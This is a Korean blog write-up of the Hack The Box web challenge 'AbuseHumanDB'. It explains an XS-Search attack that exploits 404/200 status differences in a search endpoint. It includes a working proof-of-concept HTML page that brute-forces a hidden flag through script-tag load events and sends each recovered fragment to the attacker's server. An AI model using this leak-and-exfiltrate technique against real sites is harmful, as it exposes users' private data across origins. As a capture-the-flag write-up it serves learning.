---
title: '[Hackthebox] AbuseHumanDB'
author: hoppi
date: 2023-03-30 15:47:00 + 0000
categories: [Web]
tags: [hackthebox, web, xs-search]
---

**키워드: XS-Search**  

![description](../../../assets/img/2023-03-30/description.png){: w="800" h="400" }  
<br/>

# 분석
***
## 플레그 위치
***
플레그는 아래와 같이 userEntries 테이블에 존재합니다.  
```sql
PRAGMA case_sensitive_like=ON; 

DROP TABLE IF EXISTS userEntries;

CREATE TABLE IF NOT EXISTS userEntries (
    id          INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
    title       VARCHAR(255) NOT NULL UNIQUE,
    url         VARCHAR(255) NOT NULL,
    approved    BOOLEAN NOT NULL
);

INSERT INTO userEntries (title, url, approved) VALUES ("Back The Hox :: Cyber Catastrophe Propaganda CTF against Aliens", "https://ctf.backthehox.ew/ctf/82", 1);
INSERT INTO userEntries (title, url, approved) VALUES ("Drunk Alien Song | Patlamaya Devam (official video)", "https://www.youtune.com/watch?v=jPPT7TcFmAk", 1);
INSERT INTO userEntries (title, url, approved) VALUES ("Mars Attacks! Earth is invaded by Martians with unbeatable weapons and a cruel sense of humor.", "https://www.imbd.com/title/tt0116996/", 1);
INSERT INTO userEntries (title, url, approved) VALUES ("Professor Steven Rolling fears aliens could ‘plunder, conquer and colonise’ Earth if we contact them", "https://www.thebun.co.uk/tech/4119382/professor-steven-rolling-fears-aliens-could-plunder-conquer-and-colonise-earth-if-we-contact-them/", 1);
INSERT INTO userEntries (title, url, approved) VALUES ("HTB{f4k3_fl4g_f0r_t3st1ng}","https://app.backthehox.ew/users/107", 0);
```
{: file="database.js"}
<br/>

## 기능
***
첫 번째 기능은 title 컬럼을 이용하여 user entry를 검색할 수 있습니다.  
![search](../../../assets/img/2023-03-30/search.png){: w="700" h="350" }  
<br/>

하지만 플레그가 들어있는 엔트리의 `approved`가 0으로 셋팅되어있는 것을 볼 수 있습니다. 따라서 우리는 이 엔트리를 검색할 수 없습니다. 하지만 아래와 같이 `db.getEntry()`에서 `isLocalhost()`를 통해 로컬에 의한 접근이면 `approved`를 1로 바꿀 수 있게됩니다.  
```javascript
const isLocalhost = req => ((req.ip == '127.0.0.1' && req.headers.host == '127.0.0.1:1337') ? 0 : 1);

...
// index.js: 40
router.get('/api/entries/search', (req, res) => {
	if(req.query.q) {
		const query = `${req.query.q}%`;
		return db.getEntry(query, isLocalhost(req))
			.then(entries => {
				if(entries.length == 0) return res.status(404).send(response('Your search did not yield any results!'));
				res.json(entries);
			})
			.catch(() => res.send(response('Something went wrong! Please try again!')));
	}
	return res.status(403).json(response('Missing required parameters!'));
});
```
{:file="index.js"}
<br/>

두 번째 기능은 Report를 통해서 임의의 사이트에 봇이 방문하게 할 수 있습니다.  
![report](../../../assets/img/2023-03-30/report.png){: w="700" h="350" }  
<br/>



# 취약점
***
## XS-Search
***
<u>XS-Search 또는 XS-Leak은 SOP를 우회하여 공격 대상의 정보를 유출할 수 있는 공격 방식입니다.</u> 제가 처음에 생각했던 것은 fetch를 이용하는 방법이었는데 1분 정도 생각해 보니 요청은 보낼 수 있지만 브라우저의 `CORS` 정책에 의해서 response가 불낙(block)당합니다. 하지만 아래와 같이 엔트리를 검색하는 엔드포인트에서 쿼리의 결과가 없으면 `404`, 결과가 있으면 `200`을 반환하기 때문에 이 차이를 이용하여 `XS-Search`를 할 수 있습니다.  
![diff](../../../assets/img/2023-03-30/diff.png){: w="800" h="400" }
<br/>

> XSS와 차이점 : XSS도 생각해 보면 SOP를 우회하는 공격이지만 공격 대상 오리진에 반드시 스크립트 삽입이 필요하고 희생자가 그것을 방문해야 한다는 전제조건이 깔립니다.(보통 워게임에서는 bot이 희생자의 역할을 합니다) 하지만 XS-Search의 경우 희생자가 공격자 서버에 방문만 해도 script, style, img 태그 등을 이용하여 SOP를 우회할 수 있습니다.  
{: .prompt-warning }  
<br/>

# Exploit
***
## PoC Code
***
```html
<html>
<head>
</head>
<body>

</body>
<script>
    const URL = "http://127.0.0.1:1337/api/entries/search?q=HTB{";
    //const REQ_BIN = "https://.m.pipedream.net/?f="
    const strings = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_}'
    let FLAG =""
    const xsSearch = async (char) => {
        return new Promise((resolve, reject)=>{
        const script_tag = document.createElement("script");
        script_tag.src = URL+encodeURIComponent(FLAG+char);
        script_tag.onload = () => resolve(char);
        script_tag.onerror = () => reject(char);
        document.querySelector("head").appendChild(script_tag);
      });
    };

    const getFlag = async() =>{
        let find = false;
        for (j=1; j < 5; j++){
            for(i=0; i < strings.length; i++){
                await xsSearch(strings[i]).then((res)=> {FLAG=FLAG.concat(res); fetch("/?f="+FLAG); find = res==='}' ? true:false; i=0}, (rej)=>{ });
                if (find) break;
            }
            
        }

    };
    getFlag();
</script>
</html>
```
{:file="exploit.html"}
<br/>

조금 짜증나는 점은 아래 `getEntry()`를 보면 `LIKE`를 이용하기 때문에 `%`,`_`와 같은 와일드카드가 들어가면 참을 반환하기 때문에 플레그를 얻는 과정에서 오탐이 발생합니다. 특히 `_`는 실제 플레그에도 포함되어 있어서 의심가는 부분에서 `_`를 제외하고 brute-force를 해야합니다.
![query](../../../assets/img/2023-03-30/query.png){: w="800" h="400" }
<br/>

![flag](../../../assets/img/2023-03-30/flag.png){: w="700" h="350" }
<br/>

# 잡설
***
이 문제에서 최신 버전의 `ngrok`을 사용하면 제대로 bot의 요청을 처리할 수 없을 수 있습니다. 바로 warning 페이지 때문인데요. [예전에 한 번 겪은 적이 있었죠.ㅋㅋ](https://h0pp1.github.io/posts/easter-bunny/) 최근에 `WolvCTF 2023에서 Adversal` 문제를 출제하신 분의 [롸업](https://github.com/Nolan1324/adversal-wolvctf-2023/tree/main/solvers)을 보니 아래와 같이 설정하면 `ngrok`이 `non-standard browser`로 인식하여 warning 페이지를 띄우지 않는다고 합니다. 문제를 만들 기회가 있다면 이런 부분을 참고해봐도 좋을 것 같네요.  
```javascript
const page = await ctx.newPage();
...
await page.setUserAgent('puppeteer');
```
{: file="bot.js"}
<br/>

# Reference
***
- [https://learn.dreamhack.io/330#5](https://learn.dreamhack.io/330#5)
